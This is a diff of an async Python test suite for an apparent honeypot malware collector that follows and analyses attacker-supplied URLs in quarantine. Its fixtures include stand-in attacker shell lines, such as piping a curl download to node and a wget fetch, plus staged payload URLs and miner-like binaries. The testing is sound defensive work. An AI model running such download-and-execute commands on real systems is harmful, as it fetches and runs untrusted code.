@@ -29,6 +29,7 @@ from sqlalchemy.ext.asyncio import (
 from suckerpot_analysis import ANALYSIS_VERSION
 from suckerpot_db import create_session_factory, database_url_from_env
 from suckerpot_db.roles import apply_roles
+from suckerpot_db.sample_kinds import plain_web_sample
 
 from collector.analyzer import AnalyzerService
 from collector.config import CollectorSettings
@@ -304,17 +305,22 @@ async def add_source(
     depth: int,
     parent: str | None = None,
     indicator: int | None = None,
+    via: str = "web_asset",
 ) -> None:
-    """A fetched target that served `sha`."""
+    """A fetched target that served `sha`, linked from `parent` (a link labelled `via`)."""
     async with owner.begin() as conn:
         tid = await conn.scalar(
             text(
                 "INSERT INTO fetch_targets (url, scheme, host, indicator_id, parent_sha256, depth, "
-                "status, first_seen, last_sha256) VALUES "
-                "(:u, 'http', 'files.example.test', :i, :p, :d, 'fetched', :n, :sha) RETURNING id"
+                "status, first_seen, last_sha256, typed) VALUES "
+                "(:u, 'http', 'files.example.test', :i, :p, :d, 'fetched', :n, :sha, :ty) "
+                "RETURNING id"
             ),
-            {"u": url, "i": indicator, "p": parent, "d": depth, "n": NOW, "sha": sha},
-        )
+            {
+                "u": url, "i": indicator, "p": parent, "d": depth, "n": NOW, "sha": sha,
+                "ty": indicator is not None,
+            },
+        )  # fmt: skip
         await conn.execute(
             text(
                 "INSERT INTO sample_sources (sha256, target_id, first_fetched, last_fetched) "
@@ -322,20 +328,42 @@ async def add_source(
             ),
             {"sha": sha, "t": tid, "n": NOW},
         )
+        if parent is not None:
+            await add_link(conn, parent, url, tid, via)
+
+
+async def add_link(conn: Any, parent: str, url: str, target: int, via: str) -> None:
+    """The `sample_links` row of a link from `parent` to a fetch target."""
+    await conn.execute(
+        text(
+            "INSERT INTO sample_links (sha256, kind, value, source, confidence, target_id) "
+            "VALUES (:p, 'next_url', :u, :via, 'high', :t)"
+        ),
+        {"p": parent, "u": url, "via": via, "t": target},
+    )
 
 
 async def add_pending(
     owner: AsyncEngine, url: str, parent: str, *, indicator: int | None = None, depth: int = 1
 ) -> None:
     async with owner.begin() as conn:
-        await conn.execute(
+        tid = await conn.scalar(
             text(
                 "INSERT INTO fetch_targets (url, scheme, host, indicator_id, parent_sha256, depth, "
-                "status, first_seen, next_attempt_at) VALUES "
-                "(:u, 'http', 'files.example.test', :i, :p, :d, 'pending', :n, :n)"
+                "status, first_seen, next_attempt_at, typed) VALUES "
+                "(:u, 'http', 'files.example.test', :i, :p, :d, 'pending', :n, :n, :ty) "
+                "RETURNING id"
             ),
-            {"u": url, "i": indicator, "p": parent, "d": depth, "n": NOW},
+            {
+                "u": url,
+                "i": indicator,
+                "p": parent,
+                "d": depth,
+                "n": NOW,
+                "ty": indicator is not None,
+            },
         )
+        await add_link(conn, parent, url, tid, "web_asset")
 
 
 DL = "http://dl.example.test"
@@ -502,6 +530,16 @@ async def test_a_spared_page_is_analysed_again_once_an_attacker_asks_for_it(
         css = await sample_of(owner, f"{DL}/site.css")
         inner = await sample_of(owner, f"{DL}/inner.html")
         assert {css.sha256, inner.sha256}.isdisjoint(await hashes(owner))
+        assert css.spared and inner.spared
+        # A sensor saw the style sheet's sha256 somewhere: being spared is a flag of its own.
+        async with owner.begin() as conn:
+            await conn.execute(
+                text(
+                    "INSERT INTO indicators (type, value, role, first_seen, last_seen) "
+                    "VALUES ('hash', :v, 'hash', :n, :n)"
+                ),
+                {"v": css.sha256, "n": NOW},
+            )
 
         # An attacker types the style sheet's URL: the file it already served is analysed again.
         await add_indicator(owner, f"{DL}/site.css")
@@ -518,6 +556,146 @@ async def test_a_spared_page_is_analysed_again_once_an_attacker_asks_for_it(
         urls = {r.url for r in await rows(owner, "SELECT url FROM fetch_targets")}
         assert {f"{DL}/bg.png", f"{DL}/deeper.html"} <= urls  # their links are followed now
         assert await analyzer.step() == 0  # analysed once, not in a loop
+
+        # The indicator of the typed URL is pruned later: the URL stays typed, the file evidence.
+        async with owner.begin() as conn:
+            await conn.execute(
+                text("DELETE FROM indicators WHERE value = :u"), {"u": f"{DL}/site.css"}
+            )
+        target = (
+            await rows(
+                owner,
+                "SELECT indicator_id, typed FROM fetch_targets WHERE url = :u",
+                u=f"{DL}/site.css",
+            )
+        )[0]
+        assert (target.indicator_id, target.typed) == (None, True)
+        cond = plain_web_sample("s")
+        plain = f"SELECT {cond} AS p FROM samples s WHERE s.sha256 = :s"  # noqa: S608
+        assert (await rows(owner, plain, s=css.sha256))[0].p is False
+        async with owner.begin() as conn:
+            await conn.execute(text("UPDATE samples SET analysis_version = 1"))
+        await analyzer.step()
+        again = await sample_of(owner, f"{DL}/site.css")
+        assert (again.analysis_status, again.spared) == ("done", False)
+
+
+async def test_a_later_parent_that_is_a_script_reopens_a_spared_asset(
+    owner: AsyncEngine, factories: Any, tmp_path: Path
+) -> None:
+    coll_f, ana_f = factories
+    s = settings(tmp_path)
+    store = Quarantine(s.quarantine_dir)
+    store.prepare()
+    page = b'<!doctype html><html><head><script src="http://dl.example.test/p.js"></script></head></html>'
+    asset = b'"use strict";var u="http://dl.example.test/stage3.bin";window.u=u;'
+    files = {
+        f"{HOST}/a.html": Reply(body=page),
+        f"{DL}/p.js": Reply(body=asset),
+        f"{HOST}/s.sh": Reply(body=b"#!/bin/sh\ncurl -s http://dl.example.test/p.js | node\n"),
+        f"{DL}/stage3.bin": Reply(body=tiny_elf_with_miner_strings()),
+    }
+    proxy = FakeProxy(handler_for(files))
+    await add_indicator(owner, f"{HOST}/a.html")
+    async with proxy.running():
+        gate = await open_gate(proxy.url)
+        clock = Clock()
+        svc = CollectorService(s, coll_f, store, gate, clock=clock)
+        analyzer = AnalyzerService(s, ana_f, store, clock=clock)
+        await svc.step()
+        await analyzer.step()
+        clock.now += timedelta(minutes=1)
+        await svc.step()  # p.js, an asset of the typed page
+        await analyzer.step()
+        asset_row = await sample_of(owner, f"{DL}/p.js")
+        assert (asset_row.kind, asset_row.spared) == ("javascript", True)
+        assert asset_row.sha256 not in await hashes(owner)
+
+        # Later an attacker types a script that pipes the same URL to node. The URL was queued by
+        # the page first; this second parent is what counts now.
+        await add_indicator(owner, f"{HOST}/s.sh")
+        clock.now += timedelta(minutes=1)
+        await svc.step()
+        assert await analyzer.step() == 1  # the script; it reopens the asset
+        assert (await sample_of(owner, f"{DL}/p.js")).analysis_status == "pending"
+        assert await analyzer.step() == 1
+        assert asset_row.sha256 in await hashes(owner)
+        stage = await rows(
+            owner, "SELECT depth FROM fetch_targets WHERE url = :u", u=f"{DL}/stage3.bin"
+        )
+        assert [r.depth for r in stage] == [2]
+        await svc.step()
+    assert f"{DL}/stage3.bin" in {u for u, _ in proxy.seen}
+
+
+async def test_a_link_in_the_text_of_a_typed_page_is_attacker_content(
+    owner: AsyncEngine, factories: Any, tmp_path: Path
+) -> None:
+    coll_f, ana_f = factories
+    s = settings(tmp_path)
+    store = Quarantine(s.quarantine_dir)
+    store.prepare()
+    page = b"<!doctype html><html><body><p>get it at http://dl.example.test/s2.js</p></body></html>"
+    stage = b'"use strict";var u="http://dl.example.test/bins/x.arm7";window.u=u;'
+    files = {f"{HOST}/t.html": Reply(body=page), f"{DL}/s2.js": Reply(body=stage)}
+    proxy = FakeProxy(handler_for(files))
+    await add_indicator(owner, f"{HOST}/t.html")
+    async with proxy.running():
+        gate = await open_gate(proxy.url)
+        clock = Clock()
+        svc = CollectorService(s, coll_f, store, gate, clock=clock)
+        analyzer = AnalyzerService(s, ana_f, store, clock=clock)
+        await svc.step()
+        await analyzer.step()
+        link = await rows(
+            owner, "SELECT source FROM sample_links WHERE value = :u", u=f"{DL}/s2.js"
+        )
+        assert [r.source for r in link] == ["script_url"]  # in the text, not an asset
+        clock.now += timedelta(minutes=1)
+        await svc.step()
+        await analyzer.step()
+    js = await sample_of(owner, f"{DL}/s2.js")
+    assert (js.kind, js.severity, js.spared) == ("javascript", "info", False)
+    assert js.sha256 in await hashes(owner)
+    child = await rows(
+        owner, "SELECT depth FROM fetch_targets WHERE url = :u", u=f"{DL}/bins/x.arm7"
+    )
+    assert [r.depth for r in child] == [2]
+
+
+async def test_a_target_refused_as_web_parent_comes_back_when_a_script_links_it(
+    owner: AsyncEngine, factories: Any, tmp_path: Path
+) -> None:
+    coll_f, ana_f = factories
+    s = settings(tmp_path)
+    store = Quarantine(s.quarantine_dir)
+    store.prepare()
+    root, page = "f0" * 32, "a1" * 32
+    await add_sample(owner, root, "html")
+    await add_sample(owner, page, "html")
+    await add_source(owner, page, f"{HOST}/crawled.html", depth=1, parent=root)
+    await add_pending(owner, f"{HOST}/old.js", page, depth=2)
+    files = {
+        f"{HOST}/old.js": Reply(body=b"#!/bin/sh\necho stage\n"),
+        f"{HOST}/s.sh": Reply(body=b"#!/bin/sh\nwget http://files.example.test/old.js\n"),
+    }
+    proxy = FakeProxy(handler_for(files))
+    async with proxy.running():
+        gate = await open_gate(proxy.url)
+        clock = Clock()
+        svc = CollectorService(s, coll_f, store, gate, clock=clock)
+        analyzer = AnalyzerService(s, ana_f, store, clock=clock)
+        await svc.step()
+        sql = "SELECT status, last_error FROM fetch_targets WHERE url = :u"
+        assert [tuple(r) for r in await rows(owner, sql, u=f"{HOST}/old.js")] == [
+            ("refused", "web_parent")
+        ]
+        await add_indicator(owner, f"{HOST}/s.sh")
+        await svc.step()
+        await analyzer.step()  # the script links the refused URL: back in the queue
+        assert [tuple(r) for r in await rows(owner, sql, u=f"{HOST}/old.js")] == [("pending", None)]
+        await svc.step()
+    assert f"{HOST}/old.js" in {u for u, _ in proxy.seen}
 
 
 async def test_a_target_queued_from_a_crawled_page_is_not_fetched(
